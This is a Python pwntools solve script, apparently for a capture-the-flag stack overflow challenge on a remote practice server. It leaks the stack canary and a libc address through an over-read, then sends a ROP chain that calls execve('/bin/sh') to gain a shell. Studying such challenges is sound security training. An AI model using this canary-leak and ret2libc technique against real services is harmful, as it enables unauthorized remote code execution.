from pwn import *
elf = ELF('/home/kali/Downloads/pwn_off/pwn')
p=elf.process()

cyberedu = '34.159.240.221:31770'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    gdb.attach(p, gdbscript = "b *0x04009b3")
    

p.recvuntil(b')\n')
p.sendline(b"a"*1033)

p.recvn(1033)

data = p.recvn(7)
canary = u64(data.rjust(8, b"\x00"))

data2 = p.recvn(6)
leak = u64(data2.ljust(8, b"\x00"))

print(hex(canary))
print(hex(leak))
#this is just rbp btw


#do the same but cover canary+rbp and we might get libc addr
p.recvuntil(b')\n')
#1032 bytes s1
#8 bytes canary
#8 bytes rbp
#next 8 bytes, rip
#keep adding +8 til libc address
p.sendline(b"a"*(1032+8+8+8+8*1))

p.recvn(1032+8+8+8+8*1  )

#7ffff7a2d830
#7ffff7a2d830 non aslr libc?

data3 = p.recvn(6)
leaklibc = u64(data3.ljust(8, b"\x00"))

print(hex(leaklibc))

#gadgeetsuh
pop_rdi_ret = 0x04009b3
ret = 0x4005f1
pop_rsi_r15_ret = 0x4009b1

#local
libc = leaklibc - 0x29f68
system = libc + 0x53918
execve = libc + 0xde550
binsh = libc + 0x1a7e3c

#remote 
#brute the a2d/2d part of it mb
libc = leaklibc - 0x020830
execve = libc + 0xcc770
binsh = libc + 0x18cd57


print(hex(libc))

p.recvuntil(b')\n')

payload = (b"a"*1032 +
           p64(canary) +
           b"r"*8 +
           p64(pop_rdi_ret) +
           p64(binsh) +
           p64(pop_rsi_r15_ret) +
           p64(0x0) +
           p64(0x0) +
           p64(ret) +
           p64(execve)
           )
           
p.sendline(payload)

p.interactive()
